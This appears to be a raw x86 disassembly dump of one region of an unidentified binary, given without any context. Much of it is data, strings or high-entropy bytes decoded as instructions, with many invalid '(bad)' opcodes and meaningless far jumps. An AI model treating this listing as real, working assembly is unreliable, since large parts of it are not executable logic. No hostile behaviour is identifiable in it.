  41d39b:	dec    edi
  41d39c:	cmp    eax,0x3c4fa04e
  41d3a1:	dec    esi
  41d3a2:	xor    BYTE PTR [esi+0x3f],cl
  41d3a5:	dec    esi
  41d3a6:	pop    esp
  41d3a7:	in     eax,dx
  41d3a8:	pop    edi
  41d3a9:	loop   0x41d41a
  41d3ab:	repnz outs dx,BYTE PTR ds:[esi]
  41d3ad:	repz jle 0x41d3b3
  41d3b0:	jns    0x41d3b2
  41d3b2:	jle    0x41d3c7
  41d3b4:	jns    0x41d3c6
  41d3b6:	cmp    al,0x4e
  41d3b8:	jg     0x41d408
  41d3ba:	xor    BYTE PTR [esi-0x65],cl
  41d3bd:	dec    edi
  41d3be:	xor    cl,BYTE PTR [esi-0x80]
  41d3c1:	dec    edi
  41d3c2:	cmp    al,0x4e
  41d3c4:	lods   eax,DWORD PTR ds:[esi]
  41d3c5:	dec    edi
  41d3c6:	cmp    ecx,DWORD PTR [esi+0x30]
  41d3c9:	dec    esi
  41d3ca:	inc    ebp
  41d3cb:	dec    esi
  41d3cc:	pop    esp
  41d3cd:	or     eax,0x126f025f
  41d3d2:	outs   dx,BYTE PTR ds:[esi]
  41d3d3:	adc    edi,DWORD PTR [esi+0x23]
  41d3d6:	jns    0x41d3f8
  41d3d8:	aas    
  41d3d9:	dec    esi
  41d3da:	add    BYTE PTR [eax],al
  41d3dc:	rol    BYTE PTR fs:[ecx+0x0],cl
  41d3e0:	pop    eax
  41d3e1:	aam    0x41
  41d3e3:	add    BYTE PTR [eax-0x2c],ah
  41d3e6:	inc    ecx
  41d3e7:	add    al,ch
  41d3e9:	aad    0x41
  41d3eb:	add    BYTE PTR [ebp+edx*8+0x41],dl
  41d3ef:	add    al,bl
  41d3f1:	aad    0x41
  41d3f3:	add    BYTE PTR [eax-0x2c],al
  41d3f6:	inc    ecx
  41d3f7:	add    BYTE PTR [esp+edx*8+0x41],al
  41d3fb:	add    ah,dl
  41d3fd:	aad    0x41
  41d3ff:	add    BYTE PTR [eax+0xd0041d4],ch
  41d405:	test   eax,0xba36f89c
  41d40a:	pushf  
  41d40b:	clc    
  41d40c:	pop    esp
  41d40d:	aam    0x41
  41d40f:	add    BYTE PTR [edx*8-0x2adfffbf],cl
  41d416:	inc    ecx
  41d417:	add    BYTE PTR [edx*8-0x2ac3ffbf],ch
  41d41e:	inc    ecx
  41d41f:	add    BYTE PTR [esp+edx*8-0x2d9fffbf],dl
  41d426:	inc    ecx
  41d427:	add    BYTE PTR [esp+edx*8-0x2b5bffbf],dh
  41d42e:	inc    ecx
  41d42f:	add    ah,ch
  41d431:	aad    0x41
  41d433:	add    BYTE PTR [esi+0x19f89c85],dh
  41d439:	or     edx,DWORD PTR [edi]
  41d43b:	sub    DWORD PTR [eax-0x2c],0x1c140041
  41d442:	push   ss
  41d443:	or     DWORD PTR [eax],0x7050d
  41d449:	add    BYTE PTR [eax+0x0],al
  41d44c:	cmp    al,BYTE PTR [edx+0x3e]
  41d44f:	ds retf 0x4247
  41d453:	add    BYTE PTR [ebp+0x55],ch
  41d456:	inc    esp
  41d457:	imul   ecx,DWORD PTR [eax],0x86275fa
  41d45d:	in     eax,dx
  41d45e:	inc    BYTE PTR [edi]
  41d460:	aas    
  41d461:	cli    
  41d462:	mov    ds:0x41d45005,eax
  41d467:	add    BYTE PTR [ebp-0x4a07636b],dh
  41d46d:	xchg   esi,eax
  41d46e:	pushf  
  41d46f:	clc    
  41d470:	mov    ah,0x95
  41d472:	pushf  
  41d473:	clc    
  41d474:	mov    ebx,0xbaf89c95
  41d479:	xchg   ebp,eax
  41d47a:	pushf  
  41d47b:	clc    
  41d47c:	mov    ecx,0xb8f89c95
  41d481:	xchg   ebp,eax
  41d482:	pushf  
  41d483:	clc    
  41d484:	mov    edi,0xbef89c95
  41d489:	xchg   ebp,eax
  41d48a:	pushf  
  41d48b:	clc    
  41d48c:	mov    ebp,0xa6f89c95
  41d491:	xchg   ebp,eax
  41d492:	pushf  
  41d493:	clc    
  41d494:	jmp    0x41d2:0x586003f9
  41d49b:	add    BYTE PTR [eax+edx*1+0x77530042],cl
  41d4a2:	jbe    0x41d4f4
  41d4a4:	mov    dh,0x85
  41d4a6:	pushf  
  41d4a7:	clc    
  41d4a8:	sbb    ecx,ebp
  41d4aa:	push   eax
  41d4ab:	pop    es
  41d4ac:	es pop es
  41d4ae:	add    BYTE PTR [eax],al
  41d4b0:	push   esp
  41d4b1:	rol    BYTE PTR [ecx+0x0],cl
  41d4b4:	sbb    ecx,DWORD PTR [ebx]
  41d4b6:	add    al,0xe
	...
  41d4e8:	mov    WORD PTR [eax],ss
  41d4ea:	inc    edx
  41d4eb:	add    BYTE PTR [esi+0x67f89c85],dh
  41d4f1:	pushw  0x68
  41d4f4:	addr16 push 0x67
  41d4f7:	pushw  0x6b6a
  41d4fb:	push   0x676b67
	...
  41d508:	es aas 
  41d50a:	inc    eax
  41d50b:	add    BYTE PTR [ebp-0x5db060b1],ah
  41d511:	dec    edi
  41d512:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d513:	dec    edi
  41d514:	lahf   
  41d515:	dec    edi
  41d516:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d517:	dec    edi
  41d518:	ins    DWORD PTR es:[edi],dx
  41d519:	dec    esi
  41d51a:	bound  ecx,QWORD PTR [esi+0x30]
  41d51d:	dec    esi
  41d51e:	add    BYTE PTR [eax],al
  41d520:	cdq    
  41d521:	dec    edi
  41d522:	pushf  
  41d523:	dec    edi
  41d524:	fwait
  41d525:	dec    edi
  41d526:	ins    DWORD PTR es:[edi],dx
  41d527:	dec    esi
  41d528:	bound  ecx,QWORD PTR [esi+0x30]
  41d52b:	dec    esi
  41d52c:	scas   eax,DWORD PTR es:[edi]
  41d52d:	dec    edi
  41d52e:	lods   eax,DWORD PTR ds:[esi]
  41d52f:	dec    edi
  41d530:	lahf   
  41d531:	dec    edi
  41d532:	mov    ds:0x624e6d4f,al
  41d537:	dec    esi
  41d538:	xor    BYTE PTR [esi+0x0],cl
  41d53b:	add    BYTE PTR [ebp-0x5bb067b1],ch
  41d541:	dec    edi
  41d542:	test   eax,0xa04f934f
  41d547:	dec    edi
  41d548:	fwait
  41d549:	dec    edi
  41d54a:	xor    BYTE PTR [esi+0x0],cl
  41d54d:	add    BYTE PTR [eax],al
  41d54f:	add    BYTE PTR [eax],al
  41d551:	add    BYTE PTR [eax],al
  41d553:	add    BYTE PTR [ebp+edi*2-0x62737274],cl
  41d55a:	mov    WORD PTR [ebp-0x32734274],gs
  41d560:	mov    ebp,ds
  41d562:	mov    ebp,gs
  41d564:	mov    ebp,?
  41d566:	mov    WORD PTR ds:0x2d8c1d8c,cs
  41d56c:	mov    WORD PTR ds:0x6d8c5d8c,?
  41d572:	mov    WORD PTR [edx-0x74],?
  41d575:	jae    0x41d503
  41d577:	jo     0x41d505
  41d579:	jno    0x41d507
  41d57b:	jbe    0x41d509
  41d57d:	ja     0x41d50b
  41d57f:	je     0x41d50d
  41d581:	jne    0x41d50f
  41d583:	mov    cl,BYTE PTR [ebx+ecx*4-0x76737774]
  41d58a:	mov    WORD PTR [esi+0x7d9c7c8c],cs
  41d590:	lods   al,BYTE PTR ds:[esi]
  41d591:	jge    0x41d54f
  41d593:	jge    0x41d533
  41d595:	(bad)  
  41d596:	jns    0x41d60b
  41d598:	mov    ecx,0x7d738cb1
  41d59d:	ins    DWORD PTR es:[edi],dx
  41d59e:	enter  0x9fc6,0x26
  41d5a2:	jb     0x41d5a7
  41d5a4:	test   eax,0xb956bb17
  41d5a9:	hlt    
  41d5aa:	test   al,0x37
  41d5ac:	test   al,0x7e
  41d5ae:	fnstenv [ecx-0x6a]
  41d5b1:	mov    cl,0x6a
  41d5b3:	push   0xffffffce
  41d5b5:	or     BYTE PTR [edx],bl
  41d5b7:	xlat   BYTE PTR ds:[ebx]
  41d5b8:	out    dx,eax
  41d5b9:	add    eax,0x9321d7aa
  41d5be:	scas   al,BYTE PTR es:[edi]
  41d5bf:	adc    DWORD PTR [esi],esp
  41d5c1:	jge    0x41d5e6
  41d5c3:	fidiv  WORD PTR [edi]
  41d5c5:	leave  
  41d5c6:	hlt    
  41d5c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d5c8:	cmp    ax,0x1fc8
  41d5cc:	mov    dh,cl
  41d5ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d5cf:	(bad)  
  41d5d0:	and    DWORD PTR [eax],ebx
  41d5d2:	and    DWORD PTR [ecx-0x18],esi
  41d5d5:	(bad)  [ebx+0x7]
  41d5d8:	cmc    
  41d5d9:	enter  0x301a,0x40
  41d5dd:	adc    BYTE PTR [edx+0x0],al
  41d5e0:	jno    0x41d648
  41d5e2:	jp     0x41d652
  41d5e4:	dec    eax
  41d5e5:	aam    0x41
  41d5e7:	add    BYTE PTR [esp+edx*8-0x12f7ffbf],ch
  41d5ee:	adc    al,BYTE PTR [edi]
  41d5f0:	imul   esp,DWORD PTR [esi+0x4f],0x6f704c74
  41d5f7:	ins    BYTE PTR es:[edi],dx
  41d5f8:	push   0x49657557
  41d5fd:	imul   eax,DWORD PTR fs:[ecx+edi*2+0x54],0x62
  41d603:	push   edi
  41d604:	ins    BYTE PTR es:[edi],dx
  41d605:	inc    edx
  41d606:	push   0x76666a73
  41d60b:	inc    edx
  41d60c:	jo     0x41d657
  41d60e:	dec    ebp
  41d60f:	dec    ebp
  41d610:	pop    edx
  41d611:	jp     0x41d66d
  41d613:	jbe    0x41d65b
  41d615:	pop    ecx
  41d616:	jo     0x41d690
	...
  41d62c:	inc    ebp
  41d62d:	push   edx
  41d62e:	jb     0x41d6a4
  41d630:	inc    esi
  41d631:	je     0x41d674
  41d633:	inc    esi
  41d634:	jae    0x41d6ac
  41d636:	dec    ebx
  41d637:	gs inc edx
  41d639:	inc    bx
  41d63b:	push   ebp
  41d63c:	jno    0x41d6b4
  41d63e:	ja     0x41d6a7
  41d640:	dec    edi
  41d641:	dec    esp
  41d642:	dec    ebp
  41d643:	inc    edx
  41d644:	jno    0x41d6b7
  41d646:	jae    0x41d69b
  41d648:	dec    eax
  41d649:	inc    ebp
  41d64a:	inc    esp
  41d64b:	inc    esp
  41d64c:	push   ecx
  41d64d:	dec    edx
  41d64e:	ins    BYTE PTR es:[edi],dx
  41d64f:	dec    ebx
  41d650:	jbe    0x41d6c0
  41d652:	pop    eax
  41d653:	jbe    0x41d6a0
  41d655:	inc    ecx
  41d656:	fs gs jno 0x41d6c7
  41d65a:	push   ebx
  41d65b:	inc    ecx
  41d65c:	add    BYTE PTR [eax],al
  41d65e:	inc    ebx
  41d65f:	outs   dx,BYTE PTR ds:[esi]
  41d660:	imul   esp,DWORD PTR [edi+0x7a],0x6f
  41d664:	push   edx
  41d665:	push   ecx
  41d666:	push   0x74000064
  41d66b:	jne    0x41d6e2
  41d66d:	ins    DWORD PTR es:[edi],dx
  41d66e:	push   ecx
  41d66f:	push   eax
  41d670:	jo     0x41d6ec
  41d672:	addr16 jo 0x41d6cb
  41d675:	pop    eax
  41d676:	add    BYTE PTR [eax],al
  41d678:	push   ecx
  41d679:	pop    ecx
  41d67a:	inc    ebx
  41d67b:	inc    edx
  41d67c:	outs   dx,BYTE PTR ds:[esi]
  41d67d:	popa   
  41d67e:	imul   eax,DWORD PTR [edx+0x61],0x6b
  41d682:	jne    0x41d6f2
  41d684:	dec    ebx
  41d685:	add    BYTE PTR [ecx+0x45],bh
  41d688:	bound  ebp,QWORD PTR [ecx+0x46]
  41d68b:	dec    ecx
  41d68c:	ja     0x41d6d3
  41d68e:	dec    eax
  41d68f:	inc    ebp
  41d690:	inc    edx
  41d691:	push   ebx
  41d692:	add    BYTE PTR [eax],al
  41d694:	je     0x41d6f9
  41d696:	bound  esp,QWORD PTR [edi+0x78]
  41d699:	dec    eax
  41d69a:	bound  edx,QWORD PTR [ebx+0x43]
  41d69d:	pop    eax
  41d69e:	outs   dx,DWORD PTR ds:[esi]
  41d69f:	push   0x4355
  41d6a4:	inc    edi
  41d6a5:	gs ins BYTE PTR es:[edi],dx
  41d6a7:	dec    esp
  41d6a8:	js     0x41d712
  41d6aa:	inc    edx
  41d6ab:	js     0x41d6f3
  41d6ad:	arpl   WORD PTR [eax],ax
  41d6af:	add    BYTE PTR [eax],al
  41d6b1:	add    BYTE PTR [eax],al
  41d6b3:	add    BYTE PTR [edx+0x70],cl
  41d6b6:	jb     0x41d730
  41d6b8:	outs   dx,DWORD PTR ds:[esi]
  41d6b9:	pop    eax
  41d6ba:	dec    ebx
  41d6bb:	push   esp
  41d6bc:	dec    esp
  41d6bd:	jns    0x41d70a
  41d6bf:	js     0x41d739
  41d6c1:	outs   dx,BYTE PTR ds:[esi]
  41d6c2:	pop    ecx
  41d6c3:	jae    0x41d733
  41d6c5:	push   0x43644448
  41d6ca:	arpl   WORD PTR [edx+0x55],sp
  41d6cd:	push   0x42504e67
  41d6d2:	push   ebp
  41d6d3:	je     0x41d74a
  41d6d5:	addr16 dec edi
  41d6d7:	dec    esp
  41d6d8:	inc    edx
  41d6d9:	ins    DWORD PTR es:[edi],dx
  41d6da:	inc    esi
  41d6db:	inc    esi
  41d6dc:	inc    esi
  41d6dd:	arpl   WORD PTR [edx+0x47],bx
  41d6e0:	push   ebp
  41d6e1:	inc    ebx
  41d6e2:	popa   
  41d6e3:	push   edx
  41d6e4:	dec    esp
  41d6e5:	imul   ecx,DWORD PTR [ecx+0x43],0x54706a5a
  41d6ec:	push   ecx
  41d6ed:	push   ebx
  41d6ee:	imul   ebp,DWORD PTR [ebx+0x52],0x444a454e
  41d6f5:	dec    edx
  41d6f6:	jns    0x41d761
  41d6f8:	push   edx
  41d6f9:	inc    ebx
  41d6fa:	jo     0x41d771
  41d6fc:	imul   ecx,DWORD PTR [ebx+0x50],0x48
  41d700:	fs push ebx
  41d702:	inc    ebx
  41d703:	push   ebp
  41d704:	push   eax
  41d705:	ja     0x41d781
  41d707:	jp     0x41d756
  41d709:	push   esi
  41d70a:	arpl   WORD PTR gs:[ecx+0x45],si
  41d70e:	dec    edx
  41d70f:	dec    esi
  41d710:	data16 ja 0x41d761
  41d713:	imul   ebp,DWORD PTR [eax+0x6e],0x76597148
  41d71a:	dec    esp
  41d71b:	cmp    ebx,ebp
  41d71d:	dec    esp
  41d71e:	lods   eax,DWORD PTR ds:[esi]
  41d71f:	out    dx,al
  41d720:	mov    ebp,0xa53ddffb
  41d725:	js     0x41d6e0
  41d727:	std    
  41d728:	jmp    0x1:0x9649ccb0
  41d72f:	stos   BYTE PTR es:[edi],al
  41d730:	add    BYTE PTR [eax],al
  41d732:	add    BYTE PTR [ecx],bl
  41d734:	(bad)  
  41d736:	add    eax,DWORD PTR ds:0x5102e886
  41d73c:	mov    ebx,0x569a26ab
  41d741:	sub    dh,BYTE PTR [ebx+0x7e58376c]
  41d747:	fwait
  41d748:	jno    0x41d730
  41d74a:	loop   0x41d718
  41d74c:	popa   
  41d74d:	lock adc DWORD PTR [edi-0x19994a90],ecx
  41d754:	mov    esi,0xc3205dfd
  41d759:	cmc    
  41d75a:	inc    esp
  41d75b:	xor    al,0x2c
  41d75d:	jno    0x41d730
  41d75f:	cld    
  41d760:	cwde   
  41d761:	stos   BYTE PTR es:[edi],al
  41d762:	fmul   DWORD PTR [edi+0xcab769f]
  41d768:	out    dx,eax
  41d769:	push   ebp
  41d76a:	sbb    eax,0xe0ab687f
  41d76f:	js     0x41d6f2
  41d771:	inc    esp
  41d772:	xor    eax,0x5ed6f920
  41d778:	fs jb  0x41d777
  41d77b:	call   0x32548475
  41d780:	ds loope 0x41d7eb
  41d783:	les    edi,FWORD PTR [ebx+0x53]
  41d786:	por    mm0,mm2
  41d789:	mov    dl,0x69
  41d78b:	pop    edi
  41d78c:	daa    
  41d78d:	jmp    0xbae3:0x80480210
  41d794:	or     BYTE PTR [edx-0x3a],dh
  41d797:	jg     0x41d79a
  41d799:	adc    eax,0x8824970d
  41d79e:	mov    DWORD PTR [edx-0x5778fb79],esi
  41d7a4:	out    0xa8,al
  41d7a6:	mov    BYTE PTR [edi-0xd],bl
  41d7a9:	js     0x41d818
  41d7ab:	jl     0x41d7e1
  41d7ad:	lods   al,BYTE PTR ds:[esi]
  41d7ae:	pop    eax
  41d7af:	popf   
  41d7b0:	(bad)  
  41d7b1:	pop    ebp
  41d7b2:	xchg   ebp,eax
  41d7b3:	pop    edi
  41d7b4:	dec    edx
  41d7b5:	test   BYTE PTR [esi],0x4a
  41d7b8:	call   0xd322:0x6588210a
  41d7bf:	shl    BYTE PTR [edx],cl
  41d7c1:	xchg   edi,eax
  41d7c2:	mov    ebp,0x6177a112
  41d7c7:	mov    dl,0xad
  41d7c9:	xchg   edi,eax
  41d7ca:	in     eax,dx
  41d7cb:	add    eax,0x9567e67b
  41d7d0:	sbb    BYTE PTR cs:[ebx-0x3a],0xad
  41d7d5:	add    DWORD PTR [edi+0x187cfb4b],ebx
  41d7db:	push   ecx
  41d7dc:	lock add BYTE PTR [eax],al
	...
  41d7eb:	sub    BYTE PTR [edx+0x57bf52a5],dh
  41d7f1:	(bad)  
  41d7f2:	cli    
  41d7f3:	jl     0x41d859
  41d7f5:	xlat   BYTE PTR ds:[ebx]
  41d7f6:	push   esi
  41d7f7:	sub    al,0xb4
  41d7f9:	ss (bad) 
  41d7fb:	repz xchg esi,eax
  41d7fd:	add    DWORD PTR [eax],eax
  41d7ff:	stos   BYTE PTR es:[edi],al
  41d800:	add    BYTE PTR [eax],al
  41d802:	add    BYTE PTR [edi],dh
  41d804:	daa    
  41d805:	cdq    
  41d806:	jmp    DWORD PTR [ebx]
  41d808:	aad    0xe2
  41d80a:	loopne 0x41d841
  41d80c:	cmp    ebp,DWORD PTR [eax]
  41d80e:	cmp    sp,bx
  41d811:	mov    ebx,0xb1c72ada
  41d816:	dec    ebx
  41d817:	fidivr WORD PTR [eax+esi*2+0x78]
  41d81b:	loop   0x41d854
  41d81d:	xor    al,0xf
  41d81f:	jno    0x41d864
  41d821:	test   ebx,0x42d93a78
  41d827:	retf   0x9af7
  41d82a:	int3   
  41d82b:	dec    esp
  41d82c:	mov    dl,BYTE PTR [edi+0x3c]
  41d82f:	xchg   ebx,eax
  41d830:	dec    ebx
  41d831:	loopne 0x41d882
  41d833:	mov    ds:0xb300e519,al
  41d838:	dec    edx
  41d839:	outs   dx,DWORD PTR ds:[esi]
  41d83a:	ss es push 0x94b322df
  41d841:	loop   0x41d7c3
  41d843:	icebp  
  41d844:	pop    esi
  41d845:	sti    
  41d846:	ficom  DWORD PTR [edx]
  41d848:	jg     0x41d7f5
  41d84a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d84b:	or     eax,0xdb9af8e7
  41d850:	repnz scas eax,DWORD PTR es:[edi]
  41d852:	fxch   st(4)
  41d854:	clc    
  41d855:	dec    ebp
  41d856:	sete   BYTE PTR [ebp+ebp*1+0x60abde47]
  41d85e:	sbb    eax,ecx
  41d860:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d861:	sbb    ebx,ecx
  41d863:	push   esp
  41d864:	and    DWORD PTR ds:0x57fda84b,edi
  41d86a:	sbb    BYTE PTR [edi+0x7a2a68f4],0x3e
  41d871:	xchg   ebx,eax
  41d872:	lods   eax,DWORD PTR ds:[esi]
  41d873:	sub    eax,esi
  41d875:	inc    ecx
  41d876:	dec    ecx
  41d877:	aaa    
  41d878:	jno    0x41d870
  41d87a:	outs   dx,DWORD PTR ds:[esi]
  41d87b:	in     al,0xb1
  41d87d:	add    al,0x53
  41d87f:	xor    dl,BYTE PTR [esp+eax*4]
  41d882:	sub    esi,DWORD PTR [eax+eax*4-0x65]
  41d886:	or     bh,BYTE PTR [ebx]
  41d888:	retf   0xab69
  41d88b:	add    al,0xd4
  41d88d:	outs   dx,BYTE PTR ds:[esi]
  41d88e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d88f:	mov    ch,0xd1
  41d891:	mov    cl,0x1b
  41d893:	or     DWORD PTR [edi],ebx
  41d895:	pop    eax
  41d896:	xchg   DWORD PTR [eax+0x13],edi
  41d899:	cmp    ebx,ecx
  41d89b:	inc    edi
  41d89c:	mov    al,ds:0x265b774
  41d8a1:	pop    esi
  41d8a2:	push   edx
  41d8a3:	xchg   edi,eax
  41d8a4:	pusha  
  41d8a5:	ror    ah,1
  41d8a7:	mov    al,ds:0x69997421
  41d8ac:	inc    edx
	...
  41d8b9:	add    BYTE PTR [eax],al
  41d8bb:	mov    bl,0x55
  41d8bd:	jg     0x41d840
  41d8bf:	jmp    FWORD PTR [ebx-0x69418801]
  41d8c5:	push   0xca4f4457
  41d8ca:	pushf  
  41d8cb:	popf   
  41d8cc:	xchg   edi,eax
  41d8cd:	add    DWORD PTR [eax],eax
  41d8cf:	stos   BYTE PTR es:[edi],al
  41d8d0:	add    BYTE PTR [eax],al
  41d8d2:	add    BYTE PTR [edi],ch
  41d8d4:	nop
  41d8d5:	lods   al,BYTE PTR ds:[esi]
  41d8d6:	xor    ebx,DWORD PTR ds:0x491d520e
  41d8dc:	cmc    
  41d8dd:	and    dl,BYTE PTR [edx+0x56]
  41d8e0:	and    al,0x52
  41d8e2:	lea    esp,[esi-0x76e5586a]
  41d8e8:	call   0xcd45207
  41d8ed:	test   al,0x81
  41d8ef:	ins    DWORD PTR es:[edi],dx
  41d8f0:	sbb    ebp,eax
  41d8f2:	cmp    eax,0x8c606f9d
  41d8f7:	(bad)  
  41d8f8:	icebp  
  41d8f9:	jb     0x41d926
  41d8fb:	push   es
  41d8fc:	cdq    
  41d8fd:	and    al,0x32
  41d8ff:	outs   dx,BYTE PTR ds:[esi]
  41d900:	jle    0x41d8cf
  41d902:	stos   BYTE PTR es:[edi],al
  41d903:	and    BYTE PTR [ebx+0x7cf19ada],0xe9
  41d90a:	xor    DWORD PTR [ebp-0x74],ecx
  41d90d:	mov    edx,0x45a7ea2c
  41d912:	mov    esp,0x29372f1b
  41d917:	mov    al,0xc2
  41d919:	(bad)  
  41d91a:	int    0x81
  41d91c:	sub    bh,BYTE PTR [ebx]
  41d91e:	lods   eax,DWORD PTR ds:[esi]
  41d91f:	adc    ebx,eax
  41d921:	out    0xae,al
  41d923:	and    eax,0x8722ccd1
  41d928:	mov    bl,0x6e
  41d92b:	test   DWORD PTR [ebx+0x30],eax
  41d92e:	int    0xee
  41d930:	xchg   ebp,eax
  41d931:	and    BYTE PTR [ecx-0x6d],cl
  41d934:	xchg   esp,eax
  41d935:	sbb    al,0x1b
  41d937:	xchg   DWORD PTR [ebx+0xd],edi
  41d93a:	(bad)  
  41d93b:	pushf  
  41d93c:	test   al,0x32
  41d93e:	pop    edx
  41d93f:	dec    edx
  41d940:	mov    edi,0x5a9173f3
  41d945:	mov    ebx,0xa91e75e
  41d94a:	icebp  
  41d94b:	sti    
  41d94c:	rcr    BYTE PTR [edx+0x44],0x37
  41d950:	xchg   ecx,eax
  41d951:	sbb    al,0x9f
  41d953:	mov    ch,0xf7
  41d955:	and    BYTE PTR [esi+0x21],dl
  41d958:	xchg   esi,eax
  41d959:	repz sbb BYTE PTR [ebx],bl
  41d95c:	xlat   BYTE PTR ds:[ebx]
  41d95d:	or     BYTE PTR [edi-0xf26b681],ah
  41d963:	in     eax,dx
  41d964:	dec    ebx
  41d965:	sbb    DWORD PTR [ebx-0x17d9c886],ecx
  41d96b:	std    
  41d96c:	out    dx,al
  41d96d:	stos   BYTE PTR es:[edi],al
  41d96e:	inc    edx
  41d96f:	loope  0x41d97d
  41d971:	adc    al,0x7e
  41d973:	clc    
  41d974:	out    0x20,eax
  41d976:	sub    bh,dl
  41d978:	xor    al,0xd0
  41d97a:	jecxz  0x41d923
  41d97c:	add    BYTE PTR cs:[eax],al
	...
  41d98b:	cmp    dh,dl
  41d98d:	cmp    ah,BYTE PTR [esi+edi*8]
  41d990:	in     al,dx
  41d991:	fimul  WORD PTR ds:[edi+0x4ac6bd5]
  41d998:	test   BYTE PTR [edi+0x47],dh
  41d99b:	inc    edi
  41d99c:	cwde   
  41d99d:	add    DWORD PTR [eax],eax
  41d99f:	stos   BYTE PTR es:[edi],al
  41d9a0:	add    BYTE PTR [eax],al
  41d9a2:	add    BYTE PTR [ebx+0x7387693],ah
  41d9a8:	or     ch,BYTE PTR [ebp+eiz*2-0x3528fbd8]
  41d9af:	sbb    eax,0x3c10b4a0
  41d9b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d9b5:	fnsave [ebp+0x56]
  41d9b8:	lahf   
  41d9b9:	(bad)  
  41d9ba:	adc    al,0xc
  41d9bc:	pushf  
  41d9bd:	fiadd  WORD PTR [ecx]
  41d9bf:	xchg   ebp,eax
  41d9c0:	cmp    DWORD PTR [edi-0x287950e2],ebp
  41d9c6:	mov    dh,BYTE PTR [esi+0x7e]
  41d9c9:	shl    BYTE PTR [edx+edi*2+0x62],1
  41d9cd:	pop    ebx
  41d9ce:	pop    esp
  41d9cf:	ins    BYTE PTR es:[edi],dx
  41d9d0:	jle    0x41d9f9
  41d9d2:	jne    0x41da35
  41d9d4:	xchg   edi,eax
  41d9d5:	jmp    0x41d9cf
  41d9d7:	je     0x41d982
  41d9d9:	sahf   
  41d9da:	xchg   esp,eax
  41d9db:	pop    esi
  41d9dc:	scas   al,BYTE PTR es:[edi]
  41d9dd:	popa   
  41d9de:	adc    ch,BYTE PTR [edi+0x1]
  41d9e1:	xor    eax,0x6d
  41d9e4:	push   cs
  41d9e5:	adc    eax,0xe10c6eb0
  41d9ea:	xlat   BYTE PTR ds:[ebx]
  41d9eb:	pop    edi
  41d9ec:	sbb    BYTE PTR [ecx],al
  41d9ee:	push   esi
  41d9ef:	fbld   TBYTE PTR [ebx*4-0x1192c0fb]
  41d9f6:	in     eax,dx
  41d9f7:	lock mov edi,DWORD PTR [edx]
  41d9fa:	add    al,0x7e
  41d9fc:	dec    ebp
  41d9fd:	test   ebp,edx
  41d9ff:	sbb    eax,0xc923637a
  41da04:	lahf   
  41da05:	xor    al,0x4b
  41da07:	outs   dx,BYTE PTR ds:[esi]
  41da08:	push   es
  41da09:	arpl   WORD PTR [ebx],si
  41da0b:	fs jbe 0x41d9fa
  41da0e:	js     0x41da17
  41da10:	jge    0x41d9d0
  41da12:	mov    ebp,0x3f8410c0
  41da18:	aas    
  41da19:	adc    ebx,ecx
  41da1b:	pop    ebx
  41da1c:	sub    al,0x95
  41da1e:	js     0x41d9ce
  41da20:	inc    esp
  41da21:	sbb    BYTE PTR [eax-0x25e99481],dh
  41da27:	rep stos DWORD PTR es:[edi],eax
  41da29:	lock js 0x41da98
  41da2c:	aam    0x65
  41da2e:	mov    ch,BYTE PTR [esi-0x20]
  41da31:	leave  
  41da32:	ins    BYTE PTR es:[edi],dx
  41da33:	sar    DWORD PTR [edx-0x6e],0xe7
  41da37:	xchg   ebx,eax
  41da38:	sub    ecx,DWORD PTR [ebp-0x5f]
  41da3b:	mov    ebp,0x946529ea
  41da40:	aas    
  41da41:	jmp    0x41dab5
  41da43:	popf   
  41da44:	adc    ah,BYTE PTR [ebp-0x27b13f1b]
  41da4a:	mov    eax,ds:0xd86a
	...
  41da5b:	fnstenv [esi-0x2490e49a]
  41da61:	std    
  41da62:	neg    BYTE PTR [esi]
  41da64:	sub    esp,DWORD PTR [ebx-0x23]
  41da67:	pop    ecx
  41da68:	mov    al,ch
  41da6a:	sti    
  41da6b:	icebp  
  41da6c:	cwde   
  41da6d:	add    DWORD PTR [eax],eax
  41da6f:	stos   BYTE PTR es:[edi],al
  41da70:	add    BYTE PTR [eax],al
  41da72:	add    BYTE PTR [esi],cl
  41da74:	jns    0x41da84
  41da76:	loop   0x41da75
  41da78:	or     eax,0x1788827f
  41da7d:	loope  0x41da8b
  41da7f:	out    0x80,eax
  41da81:	add    ecx,DWORD PTR [eax+0x56]
  41da84:	pushf  
  41da85:	cmp    al,0x20
  41da87:	mov    BYTE PTR [esi+0x14ac9e7b],dl
  41da8d:	pop    es
  41da8e:	test   al,0x77
  41da90:	jns    0x41daad
  41da92:	mov    dh,0xe1
  41da94:	inc    esp
  41da95:	not    DWORD PTR [ebp-0x5d]
  41da98:	cmp    edx,DWORD PTR [edi]
  41da9a:	mov    al,ds:0x4e37dcd2
  41da9f:	clc    
  41daa0:	fldenv [eax+0xb]
  41daa3:	sbb    DWORD PTR [eax+edx*4],edx
  41daa6:	pop    eax
  41daa7:	jne    0x41db15
  41daa9:	dec    ebp
  41daaa:	cmp    cl,cl
  41daac:	sub    eax,0x598f7cc
  41dab1:	xor    DWORD PTR [esi+0x5c],edx
  41dab4:	adc    al,0xeb
  41dab6:	dec    edx
  41dab7:	push   edi
  41dab8:	adc    al,0x66
  41daba:	mov    bl,0xdc
  41dabc:	mov    ss,WORD PTR [ebp-0x46e360a5]
  41dac2:	sub    al,0x81
  41dac4:	out    dx,al
  41dac5:	mov    esp,DWORD PTR [edx+eax*8]
  41dac8:	iret   
  41dac9:	cli    
  41daca:	mov    ecx,0xc510ba51
  41dacf:	mov    eax,ds:0xbe912270
  41dad4:	bt     DWORD PTR [eax+ebp*4],0x71
  41dad9:	loope  0x41db4f
  41dadb:	mov    ds:0x413b8e84,eax
  41dae0:	pop    esp
  41dae1:	je     0x41dae8
  41dae3:	add    edx,ebp
  41dae5:	cs sbb al,0x73
  41dae8:	dec    edx
  41dae9:	cmp    dl,cl
  41daeb:	adc    eax,DWORD PTR [ebx-0x57]
  41daee:	cmp    eax,0x16738b2d
  41daf3:	adc    al,0x9e
  41daf5:	lea    esp,[ebp+0x3da800]
  41dafb:	jmp    0x41dae2
  41dafd:	lahf   
  41dafe:	hlt    
  41daff:	es push edx
